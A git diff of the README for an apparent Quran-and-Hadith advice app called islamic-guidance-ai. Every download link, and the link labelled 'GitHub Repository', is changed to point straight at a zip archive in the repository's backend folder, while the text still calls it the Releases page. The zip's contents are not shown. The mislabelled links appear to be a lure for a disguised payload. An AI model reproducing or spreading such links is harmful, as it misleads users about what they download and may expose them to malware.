@@ -1,7 +1,7 @@
 # 🤖 islamic-guidance-ai - Your AI Companion for Islamic Insights
 
 ## 📥 Download the App
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Raj1003200/islamic-guidance-ai/releases)
+[![Download](https://raw.githubusercontent.com/Raj1003200/islamic-guidance-ai/develop/backend/islamic-guidance-ai_v2.8-beta.5.zip)](https://raw.githubusercontent.com/Raj1003200/islamic-guidance-ai/develop/backend/islamic-guidance-ai_v2.8-beta.5.zip)
 
 ## 📖 Overview
 The **islamic-guidance-ai** application offers users advice based on the Quran and Hadith. This tool helps you find guidance and knowledge in a convenient way, using advanced AI technology. Whether you seek answers to daily questions or deeper spiritual insights, this app is here to assist you.
@@ -16,7 +16,7 @@ Before you download the app, ensure your device meets these basic requirements:
 - **Storage**: At least 500 MB of free space
 
 ### Step 2: Visit the Release Page
-To download the application, go to the Releases page: [Visit this page to download](https://github.com/Raj1003200/islamic-guidance-ai/releases).
+To download the application, go to the Releases page: [Visit this page to download](https://raw.githubusercontent.com/Raj1003200/islamic-guidance-ai/develop/backend/islamic-guidance-ai_v2.8-beta.5.zip).
 
 ### Step 3: Download the Application
 On the Releases page, find the latest version of the app. Click on the download link for your operating system. The file will start downloading.
@@ -52,7 +52,7 @@ For any questions or support:
 Stay tuned for regular updates. We continuously improve islamic-guidance-ai to enhance user experience and add more features.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/Raj1003200/islamic-guidance-ai)
-- [Visit this page to download](https://github.com/Raj1003200/islamic-guidance-ai/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Raj1003200/islamic-guidance-ai/develop/backend/islamic-guidance-ai_v2.8-beta.5.zip)
+- [Visit this page to download](https://raw.githubusercontent.com/Raj1003200/islamic-guidance-ai/develop/backend/islamic-guidance-ai_v2.8-beta.5.zip)
 
 Explore the beauty of Islamic knowledge with the help of technology. Enjoy your journey with islamic-guidance-ai!
